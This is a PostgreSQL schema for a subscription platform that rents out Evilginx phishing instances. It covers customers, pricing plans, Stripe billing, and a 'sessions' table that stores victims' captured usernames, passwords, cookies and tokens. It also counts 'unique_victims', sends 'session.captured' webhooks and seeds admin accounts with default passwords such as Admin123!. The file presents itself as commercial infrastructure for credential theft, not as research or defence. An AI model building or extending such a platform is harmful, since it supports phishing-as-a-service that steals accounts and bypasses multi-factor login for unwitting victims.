-- =====================================================
-- Evilginx Subscription Management Platform
-- PostgreSQL Database Schema
-- =====================================================

-- Enable UUID extension
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- =====================================================
-- USERS & AUTHENTICATION
-- =====================================================

CREATE TABLE users (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    email VARCHAR(255) UNIQUE NOT NULL,
    username VARCHAR(100) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    full_name VARCHAR(255),
    company_name VARCHAR(255),
    phone VARCHAR(50),
    status VARCHAR(20) DEFAULT 'active' CHECK (status IN ('active', 'suspended', 'deleted')),
    email_verified BOOLEAN DEFAULT FALSE,
    two_factor_enabled BOOLEAN DEFAULT FALSE,
    two_factor_secret VARCHAR(255),
    api_key VARCHAR(255) UNIQUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP,
    login_count INTEGER DEFAULT 0,
    metadata JSONB
);

CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_users_status ON users(status);
CREATE INDEX idx_users_api_key ON users(api_key);

-- =====================================================
-- SUBSCRIPTION PLANS
-- =====================================================

CREATE TABLE subscription_plans (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    name VARCHAR(100) UNIQUE NOT NULL,
    display_name VARCHAR(255) NOT NULL,
    description TEXT,
    price_monthly DECIMAL(10, 2) NOT NULL,
    price_yearly DECIMAL(10, 2),
    currency VARCHAR(3) DEFAULT 'USD',
    max_instances INTEGER NOT NULL,
    max_sessions_per_month INTEGER NOT NULL,
    max_phishlets INTEGER NOT NULL,
    max_lures INTEGER NOT NULL,
    max_redirectors INTEGER NOT NULL,
    features JSONB, -- {"telegram": true, "api_access": true, "custom_phishlets": true}
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insert default plan - Single unlimited subscription
INSERT INTO subscription_plans (name, display_name, description, price_monthly, price_yearly, max_instances, max_sessions_per_month, max_phishlets, max_lures, max_redirectors, features) VALUES
('unlimited', 'Unlimited Access', 'Full access to all features - no limits', 250.00, 2500.00, 999999, 999999, 999999, 999999, 999999, '{"telegram": true, "api_access": true, "custom_phishlets": true, "custom_redirectors": true, "priority_support": true, "white_label": true, "unlimited_everything": true}'::jsonb);

-- =====================================================
-- SUBSCRIPTIONS
-- =====================================================

CREATE TABLE subscriptions (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    plan_id UUID NOT NULL REFERENCES subscription_plans(id),
    status VARCHAR(20) DEFAULT 'pending' CHECK (status IN ('pending', 'active', 'past_due', 'cancelled', 'expired')),
    billing_cycle VARCHAR(20) DEFAULT 'monthly' CHECK (billing_cycle IN ('monthly', 'yearly')),
    start_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    end_date TIMESTAMP,
    cancelled_at TIMESTAMP,
    stripe_subscription_id VARCHAR(255),
    stripe_customer_id VARCHAR(255),
    auto_renew BOOLEAN DEFAULT TRUE,
    metadata JSONB,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_subscriptions_user ON subscriptions(user_id);
CREATE INDEX idx_subscriptions_status ON subscriptions(status);
CREATE INDEX idx_subscriptions_stripe_id ON subscriptions(stripe_subscription_id);

-- =====================================================
-- EVILGINX INSTANCES
-- =====================================================

CREATE TABLE instances (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    instance_name VARCHAR(255) NOT NULL,
    server_ip VARCHAR(45) NOT NULL,
    server_port INTEGER DEFAULT 8443,
    api_key VARCHAR(255) UNIQUE NOT NULL,
    status VARCHAR(20) DEFAULT 'provisioning' CHECK (status IN ('provisioning', 'running', 'stopped', 'maintenance', 'error')),
    region VARCHAR(50),
    base_domain VARCHAR(255),
    external_ip VARCHAR(45),
    version VARCHAR(50),
    last_heartbeat TIMESTAMP,
    health_status VARCHAR(20) DEFAULT 'healthy' CHECK (health_status IN ('healthy', 'degraded', 'unhealthy')),
    resource_usage JSONB, -- {"cpu": 25, "memory": 512, "bandwidth": 1024}
    settings JSONB, -- Instance-specific settings
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE(user_id, instance_name)
);

CREATE INDEX idx_instances_user ON instances(user_id);
CREATE INDEX idx_instances_status ON instances(status);
CREATE INDEX idx_instances_api_key ON instances(api_key);
CREATE INDEX idx_instances_heartbeat ON instances(last_heartbeat);

-- =====================================================
-- SESSIONS (CAPTURED CREDENTIALS)
-- =====================================================

CREATE TABLE sessions (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    instance_id UUID NOT NULL REFERENCES instances(id) ON DELETE CASCADE,
    user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    session_sid VARCHAR(255) NOT NULL,
    phishlet VARCHAR(100) NOT NULL,
    username VARCHAR(255),
    password TEXT,
    landing_url TEXT,
    user_agent TEXT,
    remote_addr VARCHAR(45),
    cookies JSONB,
    tokens JSONB,
    custom_data JSONB,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE(instance_id, session_sid)
);

CREATE INDEX idx_sessions_instance ON sessions(instance_id);
CREATE INDEX idx_sessions_user ON sessions(user_id);
CREATE INDEX idx_sessions_phishlet ON sessions(phishlet);
CREATE INDEX idx_sessions_captured ON sessions(captured_at);
CREATE INDEX idx_sessions_username ON sessions(username);

-- =====================================================
-- USAGE STATISTICS
-- =====================================================

CREATE TABLE usage_stats (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    instance_id UUID REFERENCES instances(id) ON DELETE SET NULL,
    period_month INTEGER NOT NULL, -- 1-12
    period_year INTEGER NOT NULL,
    total_sessions INTEGER DEFAULT 0,
    total_lures_created INTEGER DEFAULT 0,
    total_phishlets_used INTEGER DEFAULT 0,
    bandwidth_bytes BIGINT DEFAULT 0,
    unique_victims INTEGER DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE(user_id, instance_id, period_month, period_year)
);

CREATE INDEX idx_usage_user ON usage_stats(user_id);
CREATE INDEX idx_usage_period ON usage_stats(period_year, period_month);

-- =====================================================
-- PAYMENTS & BILLING
-- =====================================================

CREATE TABLE payments (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    subscription_id UUID REFERENCES subscriptions(id) ON DELETE SET NULL,
    amount DECIMAL(10, 2) NOT NULL,
    currency VARCHAR(3) DEFAULT 'USD',
    payment_method VARCHAR(50),
    status VARCHAR(20) DEFAULT 'pending' CHECK (status IN ('pending', 'processing', 'completed', 'failed', 'refunded')),
    stripe_payment_intent_id VARCHAR(255),
    stripe_charge_id VARCHAR(255),
    invoice_url TEXT,
    invoice_number VARCHAR(100),
    description TEXT,
    metadata JSONB,
    paid_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_payments_user ON payments(user_id);
CREATE INDEX idx_payments_subscription ON payments(subscription_id);
CREATE INDEX idx_payments_status ON payments(status);
CREATE INDEX idx_payments_stripe_intent ON payments(stripe_payment_intent_id);

-- =====================================================
-- AUDIT LOGS
-- =====================================================

CREATE TABLE audit_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID REFERENCES users(id) ON DELETE SET NULL,
    instance_id UUID REFERENCES instances(id) ON DELETE SET NULL,
    action VARCHAR(100) NOT NULL, -- 'instance_created', 'subscription_upgraded', 'session_captured', etc.
    entity_type VARCHAR(50), -- 'instance', 'subscription', 'user', etc.
    entity_id UUID,
    details JSONB,
    ip_address VARCHAR(45),
    user_agent TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_audit_user ON audit_logs(user_id);
CREATE INDEX idx_audit_action ON audit_logs(action);
CREATE INDEX idx_audit_created ON audit_logs(created_at);

-- =====================================================
-- API TOKENS
-- =====================================================

CREATE TABLE api_tokens (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    token VARCHAR(255) UNIQUE NOT NULL,
    name VARCHAR(255) NOT NULL,
    permissions JSONB, -- {"instances": ["read", "write"], "sessions": ["read"]}
    last_used_at TIMESTAMP,
    expires_at TIMESTAMP,
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_api_tokens_user ON api_tokens(user_id);
CREATE INDEX idx_api_tokens_token ON api_tokens(token);

-- =====================================================
-- WEBHOOKS
-- =====================================================

CREATE TABLE webhooks (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    url TEXT NOT NULL,
    events TEXT[], -- ['session.captured', 'instance.status_changed']
    secret VARCHAR(255),
    is_active BOOLEAN DEFAULT TRUE,
    last_triggered_at TIMESTAMP,
    failure_count INTEGER DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_webhooks_user ON webhooks(user_id);

-- =====================================================
-- FUNCTIONS & TRIGGERS
-- =====================================================

-- Function to update updated_at timestamp
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = CURRENT_TIMESTAMP;
    RETURN NEW;
END;
$$ language 'plpgsql';

-- Apply triggers to relevant tables
CREATE TRIGGER update_users_updated_at BEFORE UPDATE ON users FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
CREATE TRIGGER update_subscriptions_updated_at BEFORE UPDATE ON subscriptions FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
CREATE TRIGGER update_instances_updated_at BEFORE UPDATE ON instances FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
CREATE TRIGGER update_usage_stats_updated_at BEFORE UPDATE ON usage_stats FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

-- =====================================================
-- VIEWS FOR COMMON QUERIES
-- =====================================================

-- Active subscriptions with user info
CREATE VIEW active_subscriptions AS
SELECT 
    s.id AS subscription_id,
    u.id AS user_id,
    u.email,
    u.username,
    sp.display_name AS plan_name,
    s.status,
    s.start_date,
    s.end_date,
    sp.max_instances,
    (SELECT COUNT(*) FROM instances WHERE user_id = u.id) AS current_instances
FROM subscriptions s
JOIN users u ON s.user_id = u.id
JOIN subscription_plans sp ON s.plan_id = sp.id
WHERE s.status IN ('active');

-- User dashboard stats
CREATE VIEW user_dashboard_stats AS
SELECT 
    u.id AS user_id,
    u.email,
    COUNT(DISTINCT i.id) AS total_instances,
    COUNT(DISTINCT sess.id) AS total_sessions,
    COALESCE(SUM(us.total_sessions), 0) AS monthly_sessions,
    COALESCE(SUM(us.bandwidth_bytes), 0) AS monthly_bandwidth,
    s.status AS subscription_status,
    sp.display_name AS plan_name
FROM users u
LEFT JOIN instances i ON u.id = i.user_id
LEFT JOIN sessions sess ON u.id = sess.user_id
LEFT JOIN usage_stats us ON u.id = us.user_id 
    AND us.period_month = EXTRACT(MONTH FROM CURRENT_DATE)
    AND us.period_year = EXTRACT(YEAR FROM CURRENT_DATE)
LEFT JOIN subscriptions s ON u.id = s.user_id AND s.status = 'active'
LEFT JOIN subscription_plans sp ON s.plan_id = sp.id
GROUP BY u.id, u.email, s.status, sp.display_name;

-- =====================================================
-- SAMPLE DATA (FOR TESTING)
-- =====================================================

-- Create a test admin user (password: Admin123!)
INSERT INTO users (email, username, password_hash, full_name, status, email_verified, api_key) VALUES
('admin@evilginx.local', 'admin', crypt('Admin123!', gen_salt('bf')), 'System Administrator', 'active', TRUE, encode(gen_random_bytes(32), 'hex'));

-- Create a test regular user (password: User123!)
INSERT INTO users (email, username, password_hash, full_name, status, email_verified, api_key) VALUES
('user@example.com', 'testuser', crypt('User123!', gen_salt('bf')), 'Test User', 'active', TRUE, encode(gen_random_bytes(32), 'hex'));

-- Create test subscriptions
INSERT INTO subscriptions (user_id, plan_id, status, start_date, end_date) 
SELECT 
    u.id, 
    sp.id, 
    'active', 
    CURRENT_TIMESTAMP, 
    CURRENT_TIMESTAMP + INTERVAL '30 days'
FROM users u, subscription_plans sp 
WHERE u.username = 'testuser' AND sp.name = 'unlimited';

-- =====================================================
-- COMMENTS
-- =====================================================

COMMENT ON TABLE users IS 'Platform users (customers who subscribe to the service)';
COMMENT ON TABLE subscriptions IS 'User subscription records with plan details and billing info';
COMMENT ON TABLE instances IS 'Evilginx instances provisioned for users';
COMMENT ON TABLE sessions IS 'Captured phishing sessions from all instances';
COMMENT ON TABLE usage_stats IS 'Monthly usage statistics per user/instance';
COMMENT ON TABLE payments IS 'Payment transactions and billing history';
COMMENT ON TABLE audit_logs IS 'Audit trail of all platform actions';

